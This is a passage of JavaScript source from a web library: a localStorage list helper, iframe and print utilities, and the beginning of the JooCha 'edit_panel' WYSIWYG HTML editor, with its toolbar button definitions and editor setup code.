function jcfList(vIdName,vSaveName)
{
var local=this;
this.attributes={"data":[],"id":"id","cursor":0};

this.jSave="jcfListStorage"+(jcfListCounter++);
if(vIdName)this.attributes.id=vIdName;
if(vSaveName)this.jSave=vSaveName;


/*Function*/
this.prepid=function prepid(p){
   if(!p)return null;
   if(p[local.attributes.id])return p;

	var ret={};
	ret[local.attributes.id]=p;
	return ret;
}

this.select=function select(p)
{
	p=local.prepid(p);
   if(p==null)return -2;

    local.attributes.cursor=-1;
    for(var i=0;i<local.attributes["data"].length;i++)
    {
        if(p[local.attributes.id]==local.attributes["data"][i][local.attributes.id])
        {
            local.attributes.cursor=i;
            break;
        }
    }
    return local.attributes.cursor;
}

this.get=function get(p){
	p=local.prepid(p);
	if(p==null)return null;
	local.select(p);
	return local.attributes["data"][local.attributes.cursor];
}

this.add=function add(p)
{
	p=local.prepid(p);
	if(p==null)return null;
	
	if(local.select(p)<0){
		local.attributes.cursor=local.attributes["data"].length;
		local.attributes["data"].push(p);

   }else {
       local.attributes["data"][local.attributes.cursor]=p;
   }
   return p[local.attributes.id];
}

this.remove=function remove(p)
{
   var l=local.select(p);
   if(l<0)return false;
	if(!local.attributes["data"][local.attributes.cursor]["__deleted"])
		local.attributes["data"][local.attributes.cursor]={"__deleted":local.attributes["data"][local.attributes.cursor]};
   return true;
}

this.toString=function toString(p)
{
   var l=local.select(p);
   if(l<0)return "";
   return JSON.stringify(local.attributes["data"][local.attributes.cursor]);
}

this.clear=function clear()
{
   local.attributes["data"]=[];
   local.attributes["cursor"]=0;
   local.save();
}

this.save=function save()	
{
    localStorage.setItem(local.jSave,JSON.stringify(local.attributes));
}

this.recovery=function recovery()
{
	var r=JSON.parse(localStorage.getItem(local.jSave));
    if(r)local.attributes=r;
}

}




/* jc_frame.js */

//-----------------========================--------------------------
var DocByPosition=document;//window.parent.document
//------------------------------------------------------
function epGetObject(iddnm)
{
return DocByPosition.getElementById(iddnm);
}
//------------------------------------------------------
function GetFrame(iddnm)
{
        var FrameID=0,i=0;
if(typeof iddnm==="object")return iddnm;

if(!FrameID){FrameID=DocByPosition.getElementById(iddnm);i=4;}
if(!FrameID){FrameID=document.getElementById(iddnm);i=5;}
		
if(!FrameID)
if(window.parent)
if(window.parent.frames)
if(window.parent.frames[iddnm])
      {FrameID=window.parent.frames[iddnm];i=1;}

if(!FrameID)
if(window.frames)
if(window.frames[iddnm])
      {FrameID=window.frames[iddnm];i=2;}

	  
if(!FrameID)
if(DocByPosition.frames)
if(DocByPosition.frames[iddnm])
if((DocByPosition.frames[iddnm].toLowerCase()=='iframe')||
   (DocByPosition.frames[iddnm].toLowerCase()=='frame'))
      {FrameID=DocByPosition.frames[iddnm];i=3;}

return FrameID;
}
//--------------------------------------------------------
function GetFrameDocumentEx(FrameID)
{
    var locdoc=0;
	if(FrameID)
	{
		if(FrameID.contentDocument)try{locdoc=FrameID.contentDocument;}catch(e){console.log(e);}
		if(!locdoc)
			if(FrameID.document)try{locdoc=FrameID.document;}catch(e){console.log(e);}
	}
return locdoc;
}
//--------------------------------------------------------
function GetFrameDocument(iddnm)
{
        var FrameID=GetFrame(iddnm);
        if(FrameID)return GetFrameDocumentEx(FrameID);
        return 0;
}
//--------------------------------------------------------
function GetFrameWindowEx(FrameID)
{
         var locdoc=0;
        if(FrameID)if(FrameID.contentWindow)locdoc=FrameID.contentWindow;
        if(!locdoc)
        if(FrameID)if(FrameID.window)locdoc=FrameID.window;

        if(!locdoc)locdoc=FrameID;
return locdoc;
}
//--------------------------------------------------------
function GetFrameWindow(iddnm)
{
        var FrameID=GetFrame(iddnm);
        if(FrameID)return GetFrameWindowEx(FrameID);
        return 0;
}
//--------------------------------------------------------
function GetFrameAttr(iddnm)
{
var Frm={FrameObject:0,FrameDocument:0,FrameWindow:0,FrameMainDiv:0};

        var FrameID=GetFrame(iddnm);
        var locdoc=GetFrameDocumentEx(FrameID);
        var locwin=GetFrameWindowEx(FrameID);

       if(locdoc)
        if(!locdoc.body)
        {
            var t=locdoc.createElement("body");
            locdoc.appendChild(t);
       }

Frm.FrameObject=FrameID;
Frm.FrameDocument=locdoc;
Frm.FrameWindow=locwin;

    if(Frm.FrameDocument)
          if(Frm.FrameDocument.getElementById)
          {
                Frm.FrameMainDiv=Frm.FrameDocument.getElementById('FrameDocument');
          }
    if(!Frm.FrameMainDiv){Frm.FrameMainDiv=Frm.FrameDocument.body;}
	
return Frm;
}
//--------------------------------------------------------
function GetFrameZoom(iddnm)
{
       var FrameAttr=GetFrameAttr(iddnm);
        var FrameID=FrameAttr.FrameObject;
        var locdoc=FrameAttr.FrameDocument;
        var locbody=FrameAttr.FrameDocument.body;
    var gcs=GetObjectZoomParameters(locdoc.body,locdoc.documentElement,1);
return gcs;
}
//--------------------------------------------------------
function ResetPrintForm(objnm)
{
    var prntw=GetFrameWindow('frameforprinter');
    if(prntw)
       if(prntw.location)
       {
           prntw.location.reload(false);
           if(objnm)window.setTimeout("PrintObject('"+objnm+"')",1000,'JavaScript');
       }
}
//--------------------------------------------------------
function ClearPrintForm(objnm)
{
var prnt=GetFrameDocument('frameforprinter');
var prntw=GetFrameWindow('frameforprinter');

   if(!prnt || !prntw)return -1;
   if(prnt.body && prntw)
   {
      prnt.body.innerHTML='';   
      if(objnm)PrintObject(objnm);
   }
  
}
//--------------------------------------------------------
function PrintObject(objnm)
{
var frm=GetFrame('frameforprinter');
var frmobj=epGetObject('frameforprinter');
var prnt=GetFrameDocument('frameforprinter');
var prntw=GetFrameWindow('frameforprinter');

if(!prnt || !prntw)return -1;
if(prnt.body && prntw)
{
var oo=document.getElementById(objnm);
if(oo == null)oo=objnm;
if(!oo)return -2;
var cln=oo.cloneNode(true);
var bd=prnt.body;
    if(prnt.getElementById('MainDocument'))bd=prnt.getElementById('MainDocument');
    cln.style.pageBreakAfter='always';

    if(bd.insertAdjacentElement)bd.insertAdjacentElement('beforeEnd',cln);
    else if(bd.appendChild)bd.appendChild(cln);

    if(frm.focus)frm.focus();
    if(frm.print)frm.print();
    else prntw.print();

}
}


/* edit_panel.js */

/**
 * edit_panel - JavaScript JooCha Library
 *
 * HTML Content editor
 * 
 * @link    http://joocha.com
 * @license For open source use: GPLv3
 *          For commercial use: Commercial License
 * @author  John Chavchanidze
 * @version 1.3.2
 *
 * See usage examples at http://joocha.com/examples
 */
 
//-----------------------------------------------------------------------------------------------------------------------------------------------
var GlobalEditPanelId=0;
var GlobalEditPanelArray=new Array();
var GlobalEditPanelFindIdArray={};
var GlobalWinCloseEvent=0;
//-----------------------------------------------------------------------------------------------------------------------------------------------
function reinitFonts(arr){
    if(!window.EP_FontList || window.EP_FontList==undefined || !Array.isArray(window.EP_FontList))window.EP_FontList=[
	'AcadNusx',
	'AcadMtavr',
	'Arial',
	'Bookman Old Style',
	'Courier',
	'Garamond',
	'Lucida Console',
	'Sylfaen',
	'Symbol',
	'Tahoma',
	'Times New Roman',
	'Verdana',
	'Webdings',
	'Wingdings',
	'Wingdings 2',
	'Wingdings 3'
	];
	

	//remove duplicate and sort
	if(arr && Array.isArray(arr)){
		EP_FontList=EP_FontList.concat(arr);
		var b={};
		for(var i=0;i<EP_FontList.length;i++){b[EP_FontList[i]]=EP_FontList[i];}
		var i=0;
		EP_FontList=[];
		for(var ky in b){EP_FontList[i++]=ky;}
		EP_FontList=EP_FontList.sort();
	}
}
reinitFonts();
//-----------------------------------------------------------------------------------------------------------------------------------------------
var EP_FontSize=new Array('6px','8px','9px','10px','11px','12px','14px','16px','18px','20px','22px','24px','30px','36px','42px','48px','56px','60px','70px','72px');
//-----------------------------------------------------------------------------------------------------------------------------------------------
function EditPanel(vTextAreaId)
{
var local=this;
this.index_php="";
this.TextAreaId=vTextAreaId;
this.EditPanelId='';
this.EditPanelIndex='';

this.TextAreaObject;
this.TextAreaChangeLine;
this.EditPanelObject;
this.EditPanelContent;
this.EditPanelCoding;
this.EditPanelCodingContainer;
this.panelIcons;
this.inputTagFilter;
this.EditPanelFrame;
this.EditPanelDivPanel;
this.EditPanelDivBody;
this.FileUploadInputObject;
this.ShowType=0;
this.DataFormat="html";
this.CodingLanguage="STANDARD";//PHP
this.NationalLanguage="ENGLISH";
this.ContentEncode="jmixx";//"base64", "jmixu" = uri(json), "json", "uri"

this.EditPanelUploadingWinName="Uploading...";
this.EPButtons=new Array('EP_B','EP_I','EP_U','EP_STYLE','EP_IMG','EP_FILE','EP_SCREP','EP_FONTSIZE','EP_FONT','EP_GALLERY','EP_TEXT','EP_HORLINE','EP_CASENUMB','EP_CASECIRCLE','EP_JLEFT','EP_JCENTER','EP_JRIGHT','EP_JFULL','EP_PRINT','EP_test','EP_UNDO','EP_REDO','EP_IMGPACK','EP_CODING','EP_UTF8','EP_ANSI','EP_QUOTES','EP_VIEW','EP_IMGDIRECT','EP_MAXIMIZE','EP_PROGRESS','EP_DOCFIELD','EP_DECODE','EP_BACKROUND','EP_COLOR');//'EP_INFOB',
this.EPButtonsAction={
EP_B:{content:"",attribute:{alt:"Bold",title:"Bold"},event:{click:function(){local.Exec('Bold');}},TagFilter:"B,STRONG,",mode:"html"},
EP_I:{content:"",attribute:{alt:"Italic",title:"Italic"},event:{click:function(){local.Exec('Italic');}},TagFilter:"I,EM,",mode:"html"},
EP_U:{content:"",attribute:{alt:"Underline",title:"Underline"},event:{click:function(){local.Exec('Underline');}},TagFilter:"U,",mode:"html"},
EP_IMG:{content:"",attribute:{alt:"Upload image by form",title:"Upload image by form"},event:{click:function(){local.EditPanelContent.focus();local.OpenUploadWin('img');}},TagFilter:"IMG,",mode:"html"},
EP_GALLERY:{content:"",attribute:{alt:"Review Photos by gallery",title:"Review photos by gallery"},event:{click:function(){local.ShowImageGallery();}},TagFilter:"U,",mode:"html"},
EP_FILE:{content:"",attribute:{alt:"Upload file by form",title:"Upload file by form"},event:{click:function(){local.EditPanelContent.focus();local.OpenUploadWin('fl');}},TagFilter:"U,",mode:"html"},
EP_SCREP:{content:"",attribute:{alt:"Set URL Link",title:"Set URL Link"},event:{click:function(){local.EditPanelContent.focus();local.OpenUploadWin('lnk');}},TagFilter:"A,",mode:"html"},
EP_STYLE:{content:"",attribute:{alt:"Set CSS Style",title:"Set CSS Style"},event:{click:function(){local.EditPanelContent.focus();local.OpenUploadWin('css');}},TagFilter:"DIV,",mode:"html"},

EP_TEXT:{content:"",attribute:{alt:"Text",title:"Text"},event:{click:function(){local.Exec('InsertFieldset');}},TagFilter:"FIELDSET,",mode:"html"},
EP_HORLINE:{content:"---",attribute:{alt:"Horizontal Line",title:"Horizontal Line"},event:{click:function(){local.Exec('InsertHorizontalRule');}},TagFilter:"HR,",mode:"html"},
EP_CASENUMB:{content:"",attribute:{alt:"List number",title:"List number"},event:{click:function(){local.Exec('InsertOrderedList');}},TagFilter:"UL,LI,OL,DIR,MENU,",mode:"html"},
EP_CASECIRCLE:{content:"",attribute:{alt:"List bullet point",title:"List bullet point"},event:{click:function(){local.Exec('InsertUnorderedList');}},TagFilter:"UL,LI,OL,DIR,MENU,",mode:"html"},

EP_JCENTER:{content:"",attribute:{alt:"Align Center",title:"Align Center"},event:{click:function(){local.Exec('JustifyCenter');}},TagFilter:"P,",mode:"html"},
EP_JLEFT:{content:"",attribute:{alt:"Align Left",title:"Align Left"},event:{click:function(){local.Exec('JustifyLeft');}},TagFilter:"P,",mode:"html"},
EP_JRIGHT:{content:"",attribute:{alt:"Align Right",title:"Align Right"},event:{click:function(){local.Exec('JustifyRight');}},TagFilter:"P,",mode:"html"},
EP_JFULL:{content:"",attribute:{alt:"Justify full",title:"Justify full"},event:{click:function(){local.Exec('JustifyFull');}},TagFilter:"P,",mode:"html"},
EP_PRINT:{content:"",attribute:{alt:"Print",title:"Print"},event:{click:function(){local.Exec('Print');}},TagFilter:"P,",mode:"html"},

EP_FONTSIZE:{content:{type:"font-size"},attribute:{alt:"Font Size",title:"Font Size","data-change-focus":"cursor.fontSize"},event:{change:function(){local.EditPanelContent.focus();local.Exec('FontSize',this.value,'if(item.style)item.style.fontSize="'+this.value+'"; else if(parent)parent.style.fontSize="'+this.value+'";');local.EditPanelContent.focus();}},TagFilter:"FONT,SPAN,",mode:"html"},
EP_FONT:{content:{type:"font"},attribute:{alt:"Set Font Family",title:"Set Font Family","data-change-focus":"cursor.fontFamily"},event:{change:function(){local.EditPanelContent.focus();local.Exec('FontName',this.value);local.EditPanelContent.focus();}},TagFilter:"FONT,SPAN,",mode:"html"},
EP_COLOR:{content:"Col",attribute:{alt:"Color",title:"Color"},event:{click:function(){local.ChangeColor();}},TagFilter:"",mode:"html"},

EP_UNDO:{content:"",attribute:{alt:"Undo",title:"Undo"},event:{click:function(){local.Exec('Undo');}},TagFilter:"",mode:"all"},
EP_REDO:{content:"",attribute:{alt:"Redo",title:"Redo"},event:{click:function(){local.Exec('Redo');}},TagFilter:"",mode:"all"},
EP_IMGPACK:{content:"",attribute:{alt:"Download Image package",title:"Download Image package"},event:{click:function(){local.PackLinks('img','src');}},TagFilter:"",mode:"html"},
EP_CODING:{content:"",attribute:{alt:"Show Source code",title:"Show source code"},event:{click:function(){local.ChangeModel();}},TagFilter:"",mode:"all"},
EP_UTF8:{content:"",attribute:{alt:"Change To UTF8",title:"Change To UTF8"},event:{click:function(){local.Exec('utf8');}},TagFilter:"",mode:"all"},
EP_ANSI:{content:"",attribute:{alt:"Change as ANSI",title:"Change as ANSI"},event:{click:function(){local.Exec('ansi');}},TagFilter:"",mode:"all"},
EP_DECODE:{content:"jmix",attribute:{alt:"JMIXX Decoder",title:"JMIXX Decoder"},event:{click:function(){local.Exec('jmixx');}},TagFilter:"",mode:"all"},
EP_QUOTES:{content:"quot",attribute:{alt:"Fix Quotes symbols",title:"Fix quotes symbols"},event:{click:function(){local.Exec('quotes');}},TagFilter:"",mode:"all"},
EP_VIEW:{content:"",attribute:{alt:"View Rendered",title:"View Rendered"},event:{click:function(){local.ShowView();}},TagFilter:"",mode:"html"},

EP_BACKROUND:{content:"BG",attribute:{alt:"Background",title:"Background"},event:{click:function(){local.ChangeBackground();}},TagFilter:"",mode:"all"},

EP_IMGDIRECT:{content:"",attribute:{alt:"Upload",title:"Upload"},event:{click:function(){local.EditPanelContent.focus();local.FileUploadInputObject.click();}},TagFilter:"",mode:"html"},
EP_INFOB:{content:"",attribute:{alt:"Info graphic",title:"Info graphic"},event:{click:function(){}},TagFilter:"",mode:"html"},
EP_PROGRESS:{content:'<progress class="EP_PROGRESS" value="0" max="100.0" style="display:block;width:100%;box-sizing:border-box;color:black;font-size:7px;"></progress><progress class="EP_PROGRESS2" value="0" max="100.0" style="display:block;width:100%;box-sizing:border-box;color:black;font-size:7px;"></progress>',attribute:{alt:"Progress bar for uploading",title:"Progress bar for uploading"},event:{click:function(){}},TagFilter:"",mode:"html"},

EP_MAXIMIZE:{content:"[><]",attribute:{alt:"Maximize/Minimize window size",title:"Maximize/Minimize window size"},event:{click:function(){local.winMaximize();}},TagFilter:"",mode:"all"},
EP_DOCFIELD:{content:"M",attribute:{alt:"Add/Remove document margin field",title:"Add/Remove document margin field"},event:{click:function(){local.docMarginField();}},TagFilter:"",mode:"html"},

END:{content:"",attribute:{alt:"",title:""},event:{},TagFilter:""}
};


this.Init=function Init(vTextAreaId)
{
	var vId="";
	var localEditPanelIndex=0;
	if(typeof vTextAreaId === "object")
	{
		local.TextAreaObject=vTextAreaId;
		vId=vTextAreaId.id;
		
		localEditPanelIndex=local.TextAreaObject.getAttribute("EditPanelIndex");
		if(localEditPanelIndex){
			local=(new EditPanel()).xGet(local.TextAreaObject.name);
			return local;
		}else
			localEditPanelIndex=GlobalEditPanelId;
		
		if(!vId)vId=vTextAreaId.id="EditPanel_AutoID"+localEditPanelIndex+"_";
		
	}else
	{
		var prev=local.xGet(vTextAreaId);
		if(prev){
			local=prev;
			return local;
		}
		vId=vTextAreaId;
		if(!vId)vId="EditPanel_AutoID"+localEditPanelIndex+"_";
		local.TextAreaObject=document.getElementById(local.TextAreaId);
		if(!local.TextAreaObject){
			return null;
		}
		
		localEditPanelIndex=local.TextAreaObject.getAttribute("EditPanelIndex");
		if(localEditPanelIndex){
			local=(new EditPanel()).xGet(vId);
			return local;
		}else
			localEditPanelIndex=GlobalEditPanelId;
	
	}
	GlobalEditPanelId++;
	local.TextAreaId=vId;

	var btns=local.TextAreaObject.getAttribute("data-buttons");
	if(btns)local.EPButtons=btns.split(",");
	
	var cl=local.TextAreaObject.getAttribute("data-coding-language");
	if(cl)local.CodingLanguage=cl.toUpperCase();
	
	var lng=local.TextAreaObject.getAttribute("data-language");
	if(lng)local.NationalLanguage=lng.toUpperCase();
	
	
	
	local.EditPanelIndex=localEditPanelIndex;
	local.TextAreaObject.setAttribute("EditPanelIndex",local.EditPanelIndex);
	
	local.EditPanelId=local.TextAreaId+"_"+localEditPanelIndex;
	
	GlobalEditPanelArray[local.EditPanelIndex]=local;
	GlobalEditPanelFindIdArray[vId]=local;
	
	
	local.EditPanelObject=document.createElement("DIV");
	local.EditPanelObject.id=local.EditPanelId;
	local.EditPanelObject.className="edit_panel_container";
	//var st=window.getComputedStyle(local.TextAreaObject, null);
	
	local.TextAreaChangeLine=null;
	local.EditPanelContent=null;
	local.EditPanelDivPanel=null;
	local.panelIcons=null;
	local.inputTagFilter=null;

    
	local.EditPanelObject.style.width="inherit";//(local.TextAreaObject.style.width?local.TextAreaObject.style.width:"inherit");
	local.EditPanelObject.style.height="inherit";//(local.TextAreaObject.style.height?local.TextAreaObject.style.height:"inherit");
	local.EditPanelObject.style.minWidth=local.TextAreaObject.style.minWidth;
	local.EditPanelObject.style.minHeight=local.TextAreaObject.style.minHeight;
	local.EditPanelObject.style.maxWidth=local.TextAreaObject.style.maxWidth;
	local.EditPanelObject.style.maxHeight=local.TextAreaObject.style.maxHeight;
	local.EditPanelObject.style.position=local.TextAreaObject.style.position;
	local.EditPanelObject.style.display=local.TextAreaObject.style.display;
	AddEventOnObject(local.EditPanelObject,"resize",local.HeightSizeCorrect);
	
	local.TextAreaObject.style.display="none";
	
	var beforeDraw=local.TextAreaObject.getAttribute("data-before-draw");
	if(beforeDraw)if(typeof beforeDraw == "function")beforeDraw();else eval(beforeDraw);
	
	local.DrawPanel();
	local.DrawFrame();
	local.DrawCoding();
	local.DrawHideEncoding();
	var v=local.TextAreaObject.getAttribute("data-format");
	if(!v)v='';
	v=local.DataFormat=v.toLowerCase();
	if(v.toLowerCase()=="text")
		local.ShowCoding();
	else
		local.ShowEditPanel();
		
	
	local.TextAreaObject.parentNode.insertBefore(local.EditPanelObject,local.TextAreaObject);
	
	var afterDraw=local.TextAreaObject.getAttribute("data-after-draw");
	if(afterDraw)if(typeof afterDraw == "function")afterDraw();else eval(afterDraw);
	
	//setInterval(local.sync,10000);
	//par.appendChild(local.EditPanelObject);
}
this.init=function init(vTextAreaId){return local.Init(vTextAreaId);}

this.AddPanelButtonEx=function AddPanelButtonEx(pan,cls,cont,attr,envt)
{
	var obj=document.createElement("li");
	obj.className=cls;
	obj.setAttribute("align","center");
	obj.setAttribute("valign","middle");
	if(attr)for(var ky in attr)obj.setAttribute(ky,attr[ky]);
	if(typeof cont=="string"){
		obj.innerHTML=cont;
		if(envt){for(var ky in envt){AddEventOnObject(obj,ky,envt[ky]);}}
	}
	else if(typeof cont=="object"){
		obj.appendChild(cont);
		if(envt){for(var ky in envt){AddEventOnObject(cont,ky,envt[ky]);}}
	}
	pan.appendChild(obj);
	return pan;
}

this.DrawPanel=function DrawPanel(onlytext)
{
	var EPSBAction=local.EPButtonsAction;
	var TagFilter="DIV,P,JCS,TABLE,TD,TR,TBODY,THEAD,OBJECT,EMBED,PARAM,STYLE,CENTER,BR,HR,LI,UL,SPAN";	
	var ret;
	for(var i=0;i<StandardTags.length;i++)TagFilter+=StandardTags[i];
	
	var idd=local.EditPanelId;
	if(!onlytext)onlytext="html";
	local.ShowType=onlytext;

	var UnSel=" HIDEFOCUS=true ATOMICSELECTION=true UNSELECTABLE=On ";
	//var UnSelObj={HIDEFOCUS:true,ATOMICSELECTION:true,UNSELECTABLE:"On"};

	var iddth=local.EditPanelId+"_frame";
	
	/*gadasaketebelia*/
	var indx=local.EditPanelIndex;

	if(!local.EditPanelDivPanel){
		local.EditPanelDivPanel=document.createElement("div");
		local.EditPanelDivPanel.id=idd+"_hdpan";
		local.EditPanelDivPanel.className="edit_panel";
	}
	local.EditPanelDivPanel.innerHTML="";

	if(!local.panelIcons){
		local.panelIcons=document.createElement("ul");
	}
		local.panelIcons.innerHTML="";
		for(var cc in EPSBAction)
		if(local.EPButtons.indexOf(cc)!=-1)
		{
			if(EPSBAction[cc].hasOwnProperty("mode"))
				if(EPSBAction[cc].mode!="all" && EPSBAction[cc].mode!="*" && EPSBAction[cc].mode!="" && EPSBAction[cc].mode!="" && EPSBAction[cc].mode!=local.ShowType)
					continue;		
			
			var attr={HIDEFOCUS:true,ATOMICSELECTION:true,UNSELECTABLE:"On"};

			if(EPSBAction[cc].attribute && (typeof EPSBAction[cc].attribute == "object")){
				for(var i in EPSBAction[cc].attribute)attr[i]=EPSBAction[cc].attribute[i];
			}
			if(EPSBAction[cc].hasOwnProperty("TagFilter"))TagFilter+=EPSBAction[cc].TagFilter;
			var cont=EPSBAction[cc].content;
			if(typeof cont == "function")cont=cont();
			var adCls='';
			if(EPSBAction[cc].hasOwnProperty("mode"))adCls=" "+EPSBAction[cc].mode;
			
			if(typeof cont == "object"){
				if(cont.type && cont.type=="font-size"){
					var fontList=document.createElement("SELECT");
					fontList.className=cc+"_select";
					fontList.setAttribute("UNSELECTABLE","on");
					fontList.value="12px";
					for(var ww=0;ww<EP_FontSize.length;ww++){
						var opt=document.createElement("OPTION");
						opt.value=EP_FontSize[ww];
						opt.innerHTML=EP_FontSize[ww];
						fontList.appendChild(opt);
					}
					cont=fontList;
					local.AddPanelButtonEx(local.panelIcons,cc+adCls,cont,attr,EPSBAction[cc].event);
				}else
				if(cont.type && cont.type=="font"){
					var fontList=document.createElement("SELECT");
					fontList.className=cc+"_select";
					fontList.setAttribute("UNSELECTABLE","on");
					fontList.value="Arial";
					//console.log(EP_FontList);		
					
					for(var ww=0;ww<EP_FontList.length;ww++){
						var opt=document.createElement("OPTION");
						opt.value=EP_FontList[ww];
						opt.innerHTML=EP_FontList[ww];
						fontList.appendChild(opt);
					}
					cont=fontList;
					local.AddPanelButtonEx(local.panelIcons,cc+adCls,cont,attr,EPSBAction[cc].event);
				}
				
			}
			else {local.AddPanelButtonEx(local.panelIcons,cc+adCls,cont,attr,EPSBAction[cc].event);}
		}

	if(!local.inputTagFilter){
		local.inputTagFilter=document.createElement("input");
		local.inputTagFilter.type="hidden";
		local.inputTagFilter.id=idd+"_tagfilter";
		local.inputTagFilter.name=idd+"_tagfilter";
		local.inputTagFilter.value=TagFilter;
	}

	
	if(!local.FileUploadInputObject){
			var dv=document.createElement("DIV");
			dv.style.position="absolute";
			dv.style.overflow="hidden";
			dv.style.width="0px";
			dv.style.height="0px";
			dv.style.top="0px";
			dv.style.left="0px";
		
			local.FileUploadInputObject=document.createElement("INPUT");
			local.FileUploadInputObject.name=idd+"_direct_file";
			local.FileUploadInputObject.id=idd+"_direct_file";
			local.FileUploadInputObject.type="file";
			local.FileUploadInputObject.style.visibility="hidden";
			local.FileUploadInputObject.style.position="absolute";
			local.FileUploadInputObject.style.width="1px";
			local.FileUploadInputObject.style.height="1px";
			local.FileUploadInputObject.style.top="-1000px";
			local.FileUploadInputObject.style.left="-1000px";
			local.FileUploadInputObject.style.zIndex=-1000;
			local.FileUploadInputObject.style.overflow="hidden";
			local.FileUploadInputObject.setAttribute("multiple","");
			
			
			dv.appendChild(local.FileUploadInputObject);
			
			local.FileUploadSubdirObject=document.createElement("INPUT");
			local.FileUploadSubdirObject.name=idd+"_direct_file_dir";
			local.FileUploadSubdirObject.id=idd+"_direct_file_dir";
			local.FileUploadSubdirObject.type="hidden";
			local.FileUploadSubdirObject.value="edit_panel";
			dv.appendChild(local.FileUploadSubdirObject);
			
			AddEventOnObject(local.FileUploadInputObject,"change", function(){
				simpleUploader(local.FileUploadInputObject,{classProgressBar:"EP_PROGRESS",procComplete:local.UploadComplete,Owner:local.EditPanelObject});
			});
			//local.EditPanelDivPanel.appendChild(local.FileUploadSubdirObject);
			//local.EditPanelDivPanel.appendChild(local.FileUploadInputObject);
			local.EditPanelDivPanel.appendChild(dv);
			
	}
		
	local.EditPanelDivPanel.appendChild(local.panelIcons);
	local.EditPanelDivPanel.appendChild(local.inputTagFilter);
	
return local.EditPanelDivPanel;
}
//--------------------------------------------------
this.DrawFrame=function DrawFrame()
{
	var OtherSrc="";
	var idd=local.EditPanelId;
	if(BrowserType!=1)OtherSrc=" src='javascript:void(0)' ";
	if(BrowserType==3)OtherSrc=" src='frame.htm' ";

	if(!local.EditPanelContent)local.EditPanelContent=document.createElement("iframe");
	
	local.EditPanelContent.id=idd+"_frame";
	local.EditPanelContent.setAttribute('contenteditable','true');
	local.EditPanelContent.src="frame.htm?2";
	local.EditPanelContent.className="epFrame";
	local.EditPanelContent.style.height="100%";
	local.EditPanelContent.style.width="100%";
	local.EditPanelContent.style.display="inline-block";
	local.EditPanelContent.onload=local.LoadFrameContent;//iframeis shemtxvevashi

return local.EditPanelContent;	
}
//--------------------------------------------------
this.DrawHideEncoding = function DrawHideEncoding(){
	var vh=document.getElementById(local.TextAreaId+"_coding_encoding");
	if(local.ContentEncode && (!vh)){
		vh=document.createElement("input");
	}
		vh.id=local.TextAreaId+"_coding_encoding";
		vh.name=vh.id;
		vh.type="hidden";
		vh.value=local.ContentEncode;
		local.EditPanelObject.appendChild(vh);
return vh;
}
//--------------------------------------------------
this.PageUp=function PageUp(e){
	local.EditPanelDivBody.scrollTo(local.EditPanelDivBody.scrollLeft,local.EditPanelDivBody.scrollTop);
	var i=parseInt(local.EditPanelDivBody.scrollTop)-parseInt(local.EditPanelDivBody.clientHeight);
	if(i<0)i=0;
	local.EditPanelDivBody.scrollTo(local.EditPanelDivBody.scrollLeft,i);
}
//--------------------------------------------------
this.PageDown=function PageDown(e){
	local.EditPanelDivBody.scrollTo(local.EditPanelDivBody.scrollLeft,local.EditPanelDivBody.scrollTop);
	var i=parseInt(local.EditPanelDivBody.scrollTop)+parseInt(local.EditPanelDivBody.clientHeight);
	if(i>local.EditPanelDivBody.scollHeight)i=local.EditPanelDivBody.scollHeight;
	local.EditPanelDivBody.scrollTo(local.EditPanelDivBody.scrollLeft,i);
}

//--------------------------------------------------
this.DrawCoding=function DrawCoding()
{
	var idd=local.EditPanelId;

	if(!local.EditPanelCoding){

	local.TextAreaObject.setAttribute("data-coding-encoder",local.ContentEncode);	
	
	local.EditPanelCodingContainer=document.createElement("TD");
	local.EditPanelCodingContainer.style.display='table-cell';
	local.EditPanelCodingContainer.style.height='inherit';
	local.EditPanelCodingContainer.style.verticalAlign='top';
	local.EditPanelCodingContainer.style.padding='0px';
	local.EditPanelCodingContainer.style.margin='0px';
	
	local.EditPanelCoding=document.createElement("textarea");
	local.EditPanelCoding.id=idd+"_coding";
	local.EditPanelCoding.className="epCoding";
	local.EditPanelCoding.style.resize="none";
	local.EditPanelCoding.setAttribute("data-for-editpanel",true);
	local.EditPanelCoding.setAttribute("data-remove","true");
	
	if(local.DataFormat=="html")
		local.EditPanelCoding.value=HtmlDecode(EditPanelValueDecoder(local.getElValue(local.TextAreaObject)));
	else 
		local.EditPanelCoding.value=EditPanelValueDecoder(local.getElValue(local.TextAreaObject));
		
	local.EditPanelCoding.style.display='inline-block';
	local.EditPanelCoding.style.overflow='scroll';
	local.EditPanelCoding.style.height='100%';
	local.EditPanelCoding.style.width='98%';
	local.EditPanelCoding.style.padding='0% 1%';
	local.EditPanelCoding.style.whiteSpace = 'pre';
	
	local.EditPanelCodingContainer.appendChild(local.EditPanelCoding);
	/*if(hotKeys){
		new hotKeys(local.EditPanelCoding,"pageup",local.PageUp);
		new hotKeys(local.EditPanelCoding,"pagedown",local.PageDown);
	}
	AddEventOnObject(local.EditPanelCoding,"keydown",local.keyLog);*/
	AddEventOnObject(local.EditPanelCoding,"keydown",local.keySpecify);
	}
	
return local.DrawChangeLine('text');
}
//-------------------------------------------------------
this.keySpecify=function keySpecify(e){
	var keyCode = e.keyCode || e.which;
	//console.log(e.shiftKey);//&& (e.shiftKey)
    if((keyCode==9) && (!e.shiftKey) ){
        e.preventDefault();
        var s = this.selectionStart;
        this.value = this.value.substring(0,this.selectionStart) + "\t" + this.value.substring(this.selectionEnd);
        this.selectionEnd = s+1; 
    }
}
//-------------------------------------------------------
this.DrawChangeLine=function DrawChangeLine(pickUp,isShow)
{
    var ot_txt=local.getElValue(local.TextAreaObject);
	var idd=local.EditPanelId;
	var indx=local.EditPanelIndex;
	if(isShow==undefined)isShow=true;
	//if(local.TextAreaChangeLine)return local.TextAreaChangeLine;
	local.TextAreaChangeLineContainer=document.createElement("TD");
	local.TextAreaChangeLineContainer.style.display='table-cell';
	local.TextAreaChangeLineContainer.style.height='inherit';
	local.TextAreaChangeLineContainer.style.width ="30px";
	local.TextAreaChangeLineContainer.style.padding ="0px";
	local.TextAreaChangeLineContainer.style.margin ="0px";
	local.TextAreaChangeLineContainer.style.verticalAlign ="top";
	
	
	local.TextAreaChangeLine=document.createElement("DIV");
	local.TextAreaChangeLine.id=idd+"_linecounter";
	local.TextAreaChangeLine.className="epChangeLine";	
	local.TextAreaChangeLine.readOnly=true;
	local.TextAreaChangeLine.setAttribute("unselectable", "on");
	local.TextAreaChangeLine.setAttribute("data-for-editpanel",true);
	local.TextAreaChangeLine.setAttribute("data-remove","true");
	local.TextAreaChangeLine.style.display ="inline-block";
	local.TextAreaChangeLine.style.verticalAlign ="top";
